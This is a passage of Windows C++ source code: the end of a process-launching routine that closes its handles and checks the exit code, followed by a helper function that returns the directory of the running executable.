			CloseHandle(ProcessInfo.hProcess);
			return false;
		}

		boResult = GetExitCodeProcess(ProcessInfo.hProcess, &dwErrorCode);
		if (FALSE == boResult)
		{
		}
	}

	CloseHandle(ProcessInfo.hThread);
	CloseHandle(ProcessInfo.hProcess);

	return true;
}

bool GetWorkingDirPathW(std::wstring& folderPath, bool bIncludeLastBackslash)
{
	DWORD dwLen;
	wchar_t* pwszTemp = NULL;
	WCHAR wszPath[MAX_PATH];

	dwLen = GetModuleFileNameW(GetModuleHandle(nullptr), wszPath, ARRAYSIZE(wszPath));
	if (0 == dwLen)
	{
		return false;
	}
	if (ERROR_INSUFFICIENT_BUFFER == GetLastError())
	{
		return false;
	}

	pwszTemp = wcsrchr(wszPath, L'\\');
	if (NULL == pwszTemp)
	{
		return false;
	}

	if (true == bIncludeLastBackslash)
	{
		pwszTemp++;
		*pwszTemp = L'\0';
	}
	else
	{
		*pwszTemp = L'\0';
	}

	folderPath = wszPath;

	return true;
}
